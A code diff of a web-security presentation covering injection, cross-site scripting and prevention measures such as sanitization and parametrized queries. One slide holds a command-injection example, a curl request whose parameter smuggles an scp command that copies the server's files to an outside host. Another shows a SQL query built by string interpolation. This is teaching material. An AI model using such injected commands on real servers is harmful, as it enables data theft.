@@ -100,7 +100,7 @@ Vue.directive("highlightjs", {
 <section>
   <h2>Web Attacks</h2>
   <div class="web-attack-container">
-    <div class="info">
+    <div class="info" style="display: flex; align-items: center">
       <ul>
         <li>9 out of 10 web applications are vulnerable</li>
         <li>Almost 1/3 of total attacks are injection attacks</li>
@@ -120,10 +120,12 @@ Vue.directive("highlightjs", {
 </section>
 <style>
   .web-attack-container {
-    display: flex;
+    display: grid;
+    grid-template-columns: 50% 50%;
+    grid-gap: 0.4em;
   }
   .web-attack-container .info {
-    width: 80%;
+    font-size: 0.8em;
   }
   .web-attack-container .map-container {
     display: flex;
@@ -132,6 +134,7 @@ Vue.directive("highlightjs", {
   }
   .web-attack-container .map-container iframe {
     height: 80%;
+    min-height: 400px;
   }
 </style>
 
@@ -305,12 +308,8 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
     <h2>Cross-Site Scripting</h2>
     <ul style="font-size: 0.8em">
       <li>
-        attacker attaches code onto a legitimate website that will execute when
-        the victim loads the website
-      </li>
-      <li>
-        helps attacker to steal user cookies to impersonate the user & show
-        popups and Ads
+        Attacker attaches javascript code onto a legitimate website that will
+        execute when the victim loads the website
       </li>
     </ul>
     <div class="diagram-illustration">
@@ -347,8 +346,8 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
   <h2>Code Injection</h2>
   <ul>
     <li>
-      An injection vulnerability manifests when application code sends untrusted
-      user input to an interpreter as part of a command or query.
+      Attacker sends untrusted user input to an interpreter as part of a command
+      or query to run arbitrary shell commands on the web server.
     </li>
   </ul>
   <div style="font-size: 0.6em; display: grid; grid-template-columns: 35% 65%">
@@ -377,15 +376,47 @@ curl http://www.ping.com/?domain=;scp%20-r%20.%20root@315.32.2.1:/home
 </section>
 
 
-<section>
-  <h2>Prevention</h2>
-  <ul>
-    <li>Don’t trust any User-Supplied Input</li>
-    <li>Input Validation/Sanitization</li>
-    <li>Parametrized queries</li>
-    <li>Web application firewall</li>
-    <li>Regular scanning of application with web vulnerability scanner</li>
-  </ul>
+<section style="font-size: 0.8em">
+  <section>
+    <h2>Prevention</h2>
+    <ul>
+      <li>Don’t trust any user-supplied input</li>
+      <li>
+        <span>Proper validation and sanitization</span>
+        <pre><code class="js">
+// Mount express-sanitizer middleware here
+app.use(expressSanitizer());
+app.post('/', function(req, res, next) {
+  // replace an HTTP posted body property with the sanitized string
+  const sanitizedString = req.sanitize(req.body.propertyToSanitize);
+  res.send({ sanitized: sanitizedString });
+});
+        </code></pre>
+      </li>
+      <li>
+        <span> Parametrized queries </span>
+        <pre><code class="java">
+String sql = "SELECT STUDENT FROM SCHOOL WHERE SCHOOL LIKE ? ";
+PreparedStatement prepStmt = conn.prepareStatement(sql);
+prepStmt.setString(1, "Waterloo%");
+ResultSet rs = prepStmt.executeQuery();
+        </code></pre>
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Prevention</h2>
+    <ul>
+      <li>
+        <span>WAF</span>
+        <img
+          src="https://avinetworks.com/wp-content/uploads/2018/08/web-application-firewall-simple-diagram_1.jpg"
+          alt=""
+        />
+      </li>
+      <li>Regular scanning with web vulnerability scanner</li>
+    </ul>
+  </section>
 </section>
 
 
